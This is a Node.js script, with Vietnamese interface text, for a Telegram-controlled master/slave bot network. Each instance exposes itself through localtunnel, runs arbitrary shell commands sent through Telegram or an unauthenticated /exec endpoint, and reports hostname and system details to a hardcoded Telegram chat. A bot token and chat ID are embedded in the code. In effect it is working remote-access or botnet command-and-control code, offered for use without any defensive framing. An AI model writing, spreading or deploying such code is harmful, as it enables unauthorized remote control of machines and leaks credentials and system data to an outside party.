const express = require('express'), TelegramBot = require('node-telegram-bot-api'), localtunnel = require('localtunnel'), { exec } = require('child_process'), https = require('https'), os = require('os');
const TOKEN = '7898378784:AAH7RAql823WY3nE25ph28kyO2N20Rhqbts', CHAT_ID = '7371969470', PORT = Math.floor(Math.random() * 2000) + 8000, HOSTNAME = os.hostname(), MASTER = process.env.MASTER === 'true', MASTER_URL = process.env.MASTER_URL;
const app = express(); app.use(express.json()); const bot = new TelegramBot(TOKEN); let startTime = Math.floor(Date.now() / 1000); let slaves = [];
const runNeofetch = cb => exec('[ -f neofetch/neofetch ] && ./neofetch/neofetch --stdout || (git clone https://github.com/dylanaraps/neofetch && ./neofetch/neofetch --stdout)', (_, o) => cb((o || '').trim()));
const extractUptime = t => (t.match(/Uptime:\s*(.+)/)?.[1] || 'unknown').trim();
const notifyLost = h => { bot.sendMessage(CHAT_ID, `⚠️ *Slave ${h} mất kết nối!*`, { parse_mode: 'Markdown' }); slaves = slaves.filter(s => s.hostname !== h); };
setInterval(() => { const now = Date.now(); slaves.forEach(s => { if (now - s.lastPing > 5000) notifyLost(s.hostname); }); }, 2000);
app.post(`/bot${TOKEN}`, (req, res) => {
  const msg = req.body?.message; if (!msg?.text || msg.date < startTime) return res.sendStatus(200); const text = msg.text.trim();
  if (text === '/help') return bot.sendMessage(msg.chat.id, '/status - Kiểm tra bot\n/cmd <lệnh> - Chạy lệnh\n/help - Trợ giúp') && res.sendStatus(200);
  if (text === '/status') return Promise.all([
    new Promise(r => runNeofetch(o => r({ type: 'master', name: HOSTNAME, uptime: extractUptime(o) }))),
    ...slaves.map(s => Promise.resolve({ type: 'slave', name: s.hostname, uptime: s.uptime }))
  ]).then(all => { let out = `🟢 Bots online (${all.length}):\n`; all.forEach(b => out += `${b.type === 'master' ? '👑 Master' : '🤖 Slave'}: ${b.name} (Uptime: ${b.uptime})\n`); bot.sendMessage(msg.chat.id, out); res.sendStatus(200); });
  if (text.startsWith('/cmd')) {
    const cmd = text.slice(4).trim(); if (!cmd) return bot.sendMessage(msg.chat.id, '⚠️ Nhập lệnh sau /cmd', { parse_mode: 'Markdown' }) && res.sendStatus(200);
    if (MASTER) {
      if (!slaves.length) return bot.sendMessage(msg.chat.id, '⚠️ Không có slave nào online.', { parse_mode: 'Markdown' }) && res.sendStatus(200);
      slaves.forEach(({ url, hostname }) => {
        const opt = { hostname: new URL(url).hostname, path: '/exec', method: 'POST', headers: { 'Content-Type': 'application/json' } };
        const req = https.request(opt, r => { let d = ''; r.on('data', c => d += c); r.on('end', () => bot.sendMessage(msg.chat.id, `💻 Slave ${hostname}:\n\`\`\`\n${d.trim()}\n\`\`\``, { parse_mode: 'Markdown' })); });
        req.on('error', e => bot.sendMessage(msg.chat.id, `❌ Slave ${hostname} lỗi: ${e.message}`, { parse_mode: 'Markdown' }));
        req.write(JSON.stringify({ cmd })); req.end();
      });
    } else exec(cmd, (e, o, err) => bot.sendMessage(msg.chat.id, `💻 Slave ${HOSTNAME}:\n\`\`\`\n${(o || err || e?.message || 'Không có output').trim()}\n\`\`\``, { parse_mode: 'Markdown' }));
    return res.sendStatus(200);
  }
  res.sendStatus(200);
});
app.post('/exec', (req, res) => exec(req.body?.cmd || '', (e, o, err) => res.send((o || err || e?.message || 'Không có kết quả').trim())));
app.post('/register', (req, res) => {
  const { port, url, hostname, uptime, report } = req.body; if (!port || !url || !hostname) return res.sendStatus(400);
  const now = Date.now(); const exist = slaves.find(s => s.hostname === hostname);
  exist ? Object.assign(exist, { port, url, uptime, lastPing: now }) : slaves.push({ port, url, hostname, uptime, lastPing: now });
  bot.sendMessage(CHAT_ID, `📩 Slave đăng ký:\n*Hostname:* ${hostname}\n*Uptime:* ${uptime}\n*URL:* ${url}\n\n\`\`\`\n${report || ''}\n\`\`\``, { parse_mode: 'Markdown' });
  res.sendStatus(200);
});
app.post('/ping', (req, res) => { const { hostname } = req.body; const s = slaves.find(s => s.hostname === hostname); if (s) s.lastPing = Date.now(); res.sendStatus(200); });
app.listen(PORT, async () => {
  const tunnel = await localtunnel({ port: PORT }); const tunnelUrl = tunnel.url;
  console.log(`🚀 PORT ${PORT}`); console.log(`🌍 URL ${tunnelUrl}`);
  runNeofetch(out => {
    const uptime = extractUptime(out);
    if (MASTER) {
      bot.setWebHook(`${tunnelUrl}/bot${TOKEN}`);
      bot.sendMessage(CHAT_ID, `👑 Master khởi động\n*Host:* ${HOSTNAME}\n*Uptime:* ${uptime}\n*URL:* ${tunnelUrl}\n*Port:* ${PORT}\n\n\`\`\`\n${out}\n\`\`\``, { parse_mode: 'Markdown' });
      bot.sendMessage(CHAT_ID, `💡 Chạy slave:\n\`\`\`\nMASTER_URL=${tunnelUrl} node bot.js\n\`\`\``, { parse_mode: 'Markdown' });
    } else if (MASTER_URL) {
      const opt = { hostname: new URL(MASTER_URL).hostname, path: '/register', method: 'POST', headers: { 'Content-Type': 'application/json' } };
      const req = https.request(opt); req.on('error', () => {}); req.write(JSON.stringify({ port: PORT, url: tunnelUrl, hostname: HOSTNAME, uptime, report: out })); req.end();
      setInterval(() => {
        const optPing = { hostname: new URL(MASTER_URL).hostname, path: '/ping', method: 'POST', headers: { 'Content-Type': 'application/json' } };
        const pingReq = https.request(optPing); pingReq.on('error', () => {}); pingReq.write(JSON.stringify({ hostname: HOSTNAME })); pingReq.end();
      }, 3000);
    }
  });
});
